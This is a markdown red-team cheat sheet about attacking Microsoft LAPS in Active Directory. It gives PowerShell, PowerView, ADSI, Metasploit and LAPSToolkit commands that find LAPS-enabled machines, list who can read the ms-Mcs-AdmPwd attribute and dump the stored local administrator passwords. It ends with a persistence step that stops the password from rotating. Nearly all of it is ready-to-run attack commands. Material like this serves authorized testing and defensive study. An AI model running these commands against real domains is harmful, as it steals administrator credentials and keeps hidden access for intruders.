# LAPS

## Description

The "Local Administrator Password Solution" (LAPS) provides management of local account passwords of domain joined computers. Passwords are stored in Active Directory (AD) and protected by ACL, so only eligible users can read it or request its reset.

## Enumeration

### Check if LAPS is installed

```bash
# Identify if installed to Program Files
Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'
Get-ChildItem 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll'
dir 'C:\Program Files\LAPS\CSE\'
dir 'C:\Program Files (x86)\LAPS\CSE\'

# Identify if installed by checking the AD Object
Get-ADObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=DC01,DC=Security,CN=Local'
```

### Enumerate GPO's that have "LAPS" in the name

```powershell
# PowerView
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl
```

### Find ms-mcs-admpwd attribute

```bash
# Powerview
Get-DomainComputer Computer | Select-Object 'name','ms-mcs-admpwd'
Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName

# PowerShell
Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | Select-Object 'Name','ms-Mcs-AdmPwd'

# Native
([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))").findAll() | ForEach-Object { Write-Host "" ; $_.properties.cn ; $_.properties.'ms-mcs-admpwd'}
```

### LAPS Configuration file

If LAPS is deployed by a GPO, we can identify the configuratio file to discover some details about the configuration.

```powershell
Get-Content "\\dev.cyberbotic.io\SysVol\Security.local\Policies\{3374337D-C131-4D23-A029-7B983923E665}\Machine\Registry.pol"
```

After downloading the GPO registry.pol file use `Parse-PolFile` to read the file.

**GPRegistryPolicyParser:** [https://github.com/PowerShell/GPRegistryPolicyParser](https://github.com/PowerShell/GPRegistryPolicyParser)

```powershell
Parse-PolFile "Registry.pol"
```

* Password complexity is upper, lower and numbers.
* Password length is 14.
* Passwords are changed every 30 days.
* The LAPS managed account name is LapsAdmin.
* Password expiration protection is disabled.

### LAPS Module commands

```bash
# Import module
Import-Module AdmPwd.PS

# Find the OUs that can read LAPS passwords
Find-AdmPwdExtendedRights -Identity <OU>

# Once we have compromised a user that can read LAPS
Get-AdmPwdPassword -ComputerName <Hostname>
```

The following can be used to identify what objects have the ability to read the LAPS password property for a specified computer inside the domain

Get ACL's where objects are allowed to read the LAPS password property.

{% code overflow="wrap" %}
```powershell
# Powerview
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier

# Powerview
Get-NetOU | Get-ObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentitySID' $(Convert-NameToSid $_.IdentityReference).SID; $_}
```
{% endcode %}

### Metasploit

```bash
use post/windows/gather/credentials/enum_laps
```

## LAPSToolkit

**GitHub:** [https://github.com/leoloobeek/LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)

```powershell
# Gets all computers which have LAPS enabled
Get-LAPSComputers

# Get Groups that can read the ms-Mcs-AdmPwd attribute
Find-LAPSDelegatedGroups

# Checks for ExtendedRights for Laps on each AD Computer
Find-AdmPwdExtendedRights
```

## LAPS Persistence

LAPS may be configured to automatically update a computers password on a regular basis. If we have compromised a computer and elevated to SYSTEM we can update the value to never expire for 10 years as a means of persistence.

```powershell
Set-DomainObject -Identity wkstn-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '136257686710000000'} -Verbose
Setting 'ms-Mcs-AdmPwdExpirationTime' to '136257686710000000' for object '[HostName$]'
```
